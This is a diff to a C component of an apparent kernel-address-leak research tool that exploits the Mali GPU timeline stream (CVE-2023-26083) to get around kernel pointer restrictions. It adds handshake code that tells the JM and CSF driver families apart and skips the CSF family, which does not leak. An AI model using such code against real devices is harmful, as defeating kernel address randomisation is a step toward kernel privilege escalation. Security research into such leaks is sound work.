@@ -29,12 +29,13 @@
 // Coverage: this targets the LEGACY timeline tracepoint family (tl_new_ctx and
 // friends) that serialise raw pointers — Midgard, Bifrost and Valhall-JM
 // (Mali-G57/G77/G78), i.e. most Mali devices up to ~2022. The newer KBase
-// tracepoint family (tl_kbase_new_ctx, used by Valhall-CSF / Mali-G710+) and
-// post-fix drivers identify objects by u32 id, not pointer, so they yield no
-// kernel-VAS value and this component reports nothing — which is also the
-// runtime signal that a target is patched/CSF. Being scan-based, the component
-// needs no per-version knowledge: it emits whatever kernel pointers the stream
-// actually carries.
+// tracepoint family (tl_kbase_new_ctx, used by Valhall-CSF / Mali-G710+)
+// identifies objects by u32 id, not pointer, so it discloses no kernel-VAS
+// value; the CSF family is recognised at the version-check handshake (a
+// distinct ioctl number) and reported directly, without probing the leak-free
+// stream, while a post-fix JM driver instead yields an empty scan. Being
+// scan-based on the JM path, the component needs no per-version knowledge: it
+// emits whatever kernel pointers the stream actually carries.
 //
 // Deferred improvement: a per-version packet parser. The scan cannot type a
 // value, so it relies on heuristics — a kernel floor, an alignment gate, and a
@@ -109,9 +110,13 @@ KASLD_META("method:parsed\n"
            "config:CONFIG_MALI_MIDGARD\n"
            "note:bypasses_kptr_restrict\n");
 
-/* Mali kbase UABI (uapi/.../mali_kbase_ioctl.h): type 0x80; numbers stable
- * across the modern ABI (r21p0..). The acquire ioctl's return value is the
- * timeline stream fd. */
+/* Mali kbase UABI (uapi/.../mali_kbase_ioctl.h): type 0x80. The version-check
+ * ioctl differs by driver family: the Job Manager family (Midgard, Bifrost,
+ * Valhall-JM) numbers it 0, while the Command Stream Frontend family
+ * (Valhall-CSF, Mali-G710+) numbers it 52. SET_FLAGS (1) and the timeline
+ * ioctls (18, 19) belong to the JM family this technique leaks from; their
+ * numbers are stable across the modern JM ABI (r21p0..). The acquire ioctl's
+ * return value is the timeline stream fd. */
 #define KBASE_IOCTL_TYPE 0x80
 struct kbase_ioctl_version_check {
   uint16_t major;
@@ -123,8 +128,10 @@ struct kbase_ioctl_set_flags {
 struct kbase_ioctl_tlstream_acquire {
   uint32_t flags;
 };
-#define KBASE_IOCTL_VERSION_CHECK                                              \
+#define KBASE_IOCTL_VERSION_CHECK_JM                                           \
   _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
+#define KBASE_IOCTL_VERSION_CHECK_CSF                                          \
+  _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
 #define KBASE_IOCTL_SET_FLAGS                                                  \
   _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
 #define KBASE_IOCTL_TLSTREAM_ACQUIRE                                           \
@@ -288,24 +295,47 @@ int main(int argc, char **argv) {
   if (fd < 0)
     return kasld_disp_absent("no Mali GPU device node present");
 
-  /* Mandatory handshake, then create the context. VERSION_CHECK is in/out: it
-   * writes the kernel's own version back into the struct. Some kbase versions
-   * reject a mismatched major (leaving SET_FLAGS to fail), so probe once to
-   * learn the kernel version, then re-handshake with it so the major matches.
-   */
+  /* Mandatory handshake. VERSION_CHECK is a pure query — it writes the kernel's
+   * own version back into the struct and returns 0 whenever the request NUMBER
+   * is the one this driver implements. That number is how the two families are
+   * told apart: try the JM number first (this technique's target), then the CSF
+   * number. A non-zero return from both means the node speaks neither kbase UK
+   * ABI. */
   struct kbase_ioctl_version_check vc = {.major = 11, .minor = 0};
-  if (mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc) != 0) {
-    kasld_err("KBASE_IOCTL_VERSION_CHECK failed (not Mali / incompatible ABI)");
-    close(fd);
-    /* The device node exists but does not speak the kbase UK ABI, so it is
-     * not a target this technique can address. */
-    return kasld_disp_absent("device node is not a kbase Mali GPU, or its UK "
-                             "ABI is incompatible");
+  int is_csf = 0;
+  if (mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK_JM, &vc) != 0) {
+    int jm_errno = errno;
+    if (mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK_CSF, &vc) == 0) {
+      is_csf = 1;
+    } else {
+      kasld_err("KBASE_IOCTL_VERSION_CHECK failed (JM: %s; CSF: %s)",
+                strerror(jm_errno), strerror(errno));
+      close(fd);
+      /* The node exists but speaks neither the JM nor the CSF kbase UK ABI, so
+       * it is not a target this technique can address. */
+      return kasld_disp_absent("device node is not a kbase Mali GPU, or its UK "
+                               "ABI is neither JM nor CSF");
+    }
   }
-  kasld_info("Mali kbase UK ABI version %u.%u", vc.major, vc.minor);
-  /* re-handshake with the kernel's reported version (harmless if already
-   * matched) */
-  (void)mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
+  kasld_info("Mali kbase UK ABI %u.%u (%s)", vc.major, vc.minor,
+             is_csf ? "CSF" : "JM");
+
+  /* The CSF family (Valhall-CSF, Mali-G710+) serialises timeline objects by an
+   * obfuscated u32 id, not a raw pointer — both the CVE-2023-26083 fix (r43p0+)
+   * and the CSF timeline design close this disclosure — so a CSF timeline
+   * carries no kernel-VAS value. Report the family rather than probing a stream
+   * that cannot leak (the CSF timeline ioctls are numbered differently again).
+   */
+  if (is_csf) {
+    close(fd);
+    return kasld_disp_absent("Mali CSF driver (Mali-G710+): timeline object "
+                             "ids are obfuscated, no kernel pointer disclosed");
+  }
+
+  /* JM family: re-handshake with the kernel's reported version. Some kbase
+   * versions reject a mismatched major at SET_FLAGS, so echo back what the
+   * kernel just reported (harmless if already matched). */
+  (void)mali_ioctl(fd, KBASE_IOCTL_VERSION_CHECK_JM, &vc);
 
   struct kbase_ioctl_set_flags sf = {.create_flags = 0};
   if (mali_ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) != 0) {
